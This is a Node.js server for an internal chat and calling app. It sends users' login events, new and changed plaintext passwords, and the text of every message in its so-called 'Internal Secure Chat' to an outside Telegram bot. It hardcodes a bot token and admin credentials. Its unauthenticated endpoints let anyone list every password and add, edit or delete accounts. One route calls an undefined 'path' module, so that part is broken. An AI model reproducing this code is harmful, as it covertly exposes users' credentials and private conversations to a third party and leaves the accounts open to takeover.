const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, { cors: { origin: "*", methods: ["GET", "POST"] } });
const axios = require('axios');

const PORT = process.env.PORT || 3000; 

// 🛡️ [MANDATORY] আপনার টেলিগ্রাম বটের ডাটা এখানে আপডেট করুন
const TELEGRAM_BOT_TOKEN = "7963380066:AAHI12Dshw2H4-ZcZof6v2D8H6w3E_A6kS8"; 
const TELEGRAM_CHAT_ID = "6377519390"; 

const ADMIN_USER = "salam";
const ADMIN_PASS = "864";

// 🌐 Render ক্লাউড রানটাইম মেমোরি স্টোরেজ (ফাইল ক্র্যাশ এড়াতে গ্লোবাল অ্যারে)
let GLOBAL_MEMORY_USERS = [
    { username: "08640000001", password: "521021", name: "Abdus Salam" },
    { username: "08640000002", password: "halima", name: "Halima Akter" }
];
let GLOBAL_MEMORY_LOGS = [];

app.use(express.json());
app.use(express.static(__dirname));

async function pushToTelegramBot(message) {
    if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes("YOUR_BOT")) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' });
    } catch (e) { console.error("Telegram Sync Error:", e.message); }
}

// লগইন এপিআই ও টেলিগ্রাম পুশ
app.post('/api/login', (req, res) => {
    const { username, password, ipAddress, device } = req.body;
    let text = "";

    if (username === ADMIN_USER && password === ADMIN_PASS) {
        text = `🔐 <b>Admin Login Success</b>\n👤 Identity: Admin Node\n🌐 IP Address: ${ipAddress}\n📱 Platform: ${device}`;
        pushToTelegramBot(text);
        return res.json({ success: true, role: 'admin', name: 'Administrator', username: ADMIN_USER });
    }
    
    const user = GLOBAL_MEMORY_USERS.find(u => u.username === username && u.password === password);
    if (user) {
        text = `🔓 <b>User Login Alert</b>\n👤 Name: ${user.name}\n🔢 Extension: ${user.username}\n🌐 IP Address: ${ipAddress}\n📱 Platform: ${device}`;
        pushToTelegramBot(text);
        return res.json({ success: true, role: 'user', name: user.name, username: user.username });
    }
    return res.json({ success: false, message: 'Invalid Extension or Password' });
});

// ইউজার ক্রিয়েট, এডিট এবং ডিলিট অপারেশন + টেলিগ্রাম লগ
app.post('/api/manage-user', (req, res) => {
    const { action, username, password, name, oldUsername, creator } = req.body;
    let text = "";

    if (action === 'add') {
        if (GLOBAL_MEMORY_USERS.find(u => u.username === username)) {
            return res.json({ success: false, message: 'Extension already exists!' });
        }
        GLOBAL_MEMORY_USERS.push({ username, password, name });
        text = `➕ <b>User Account Created</b>\n👤 Full Name: ${name}\n🔢 Ext Number: ${username}\n🔑 Key Pass: ${password}\n✍️ Registered By: ${creator}`;
    } 
    else if (action === 'edit') {
        const index = GLOBAL_MEMORY_USERS.findIndex(u => u.username === oldUsername);
        if (index !== -1) {
            GLOBAL_MEMORY_USERS[index] = { username, password, name };
            text = `📝 <b>Full Profile Updated</b>\n🔄 Target Ext: ${oldUsername}\n👤 New Name: ${name}\n🔢 New Ext: ${username}\n🔑 New Pass: ${password}`;
        }
    } 
    else if (action === 'delete') {
        GLOBAL_MEMORY_USERS = GLOBAL_MEMORY_USERS.filter(u => u.username !== username);
        text = `❌ <b>User Account Deleted</b>\n🔢 Ext Number: ${username}`;
    }

    pushToTelegramBot(text);
    res.json({ success: true });
});

app.get('/api/users', (req, res) => res.json(GLOBAL_MEMORY_USERS));
app.get('/api/logs', (req, res) => res.json(GLOBAL_MEMORY_LOGS));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// সকেট আইও রিয়েল-টাইম রাউটিং ইঞ্জিন
io.on('connection', (socket) => {
    
    socket.on('register_user', (data) => {
        socket.userData = data;
    });

    // ইউজার টু ইউজার মেসেজ ব্রডকাস্টার ও টেলিগ্রাম ডাটা পাঠানো
    socket.on('send_message', (data) => {
        const receiverSocket = Array.from(io.sockets.sockets.values()).find(
            s => s.userData && s.userData.username === data.targetUsername
        );
        if (receiverSocket) {
            receiverSocket.emit('receive_message', { sender: socket.userData.username, text: data.text });
        }
        pushToTelegramBot(`💬 <b>Internal Secure Chat</b>\nFrom: ${socket.userData.name} (${socket.userData.username})\nTo Target: ${data.targetUsername}\n✉️ Text: ${data.text}`);
    });

    // কল অফার রাউটিং
    socket.on('call_offer', (data) => {
        const receiverSocket = Array.from(io.sockets.sockets.values()).find(
            s => s.userData && s.userData.username === data.targetUsername
        );
        if (receiverSocket) {
            receiverSocket.emit('incoming_call', {
                callerName: data.callerName,
                callerUsername: data.callerUsername,
                callerSocketId: socket.id, 
                offer: data.offer
            });
        } else {
            socket.emit('call_error', { message: `Extension Line ${data.targetUsername} is Offline.` });
        }
    });

    socket.on('call_answer', (data) => {
        io.to(data.callerSocketId).emit('call_accepted', { answer: data.answer });
    });

    socket.on('ice_candidate', (data) => {
        const targetSocket = Array.from(io.sockets.sockets.values()).find(
            s => s.userData && s.userData.username === data.targetUsername
        );
        if (targetSocket) targetSocket.emit('ice_candidate_received', { candidate: data.candidate });
    });

    // কল লগ জেনারেট ও টেলিগ্রাম পাঠানো
    socket.on('log_call_telegram', (data) => {
        const logItem = {
            caller: data.caller,
            receiver: data.receiver,
            duration: data.duration,
            time: new Date().toLocaleTimeString()
        };
        GLOBAL_MEMORY_LOGS.unshift(logItem);
        if(GLOBAL_MEMORY_LOGS.length > 30) GLOBAL_MEMORY_LOGS.pop();

        pushToTelegramBot(`📞 <b>Call Logs Summary</b>\n🟢 Source Ext: ${data.caller}\n🔴 Target Ext: ${data.receiver}\n⏱️ Call Duration: ${data.duration} Seconds`);
    });

    socket.on('hangup', (data) => {
        if(data && data.targetUsername) {
            const targetSocket = Array.from(io.sockets.sockets.values()).find(
                s => s.userData && s.userData.username === data.targetUsername
            );
            if(targetSocket) targetSocket.emit('call_disconnected');
        }
        socket.broadcast.emit('call_disconnected');
    });

    socket.on('disconnect', () => {});
});

http.listen(PORT, '0.0.0.0', () => console.log(`Server live on port ${PORT}`));
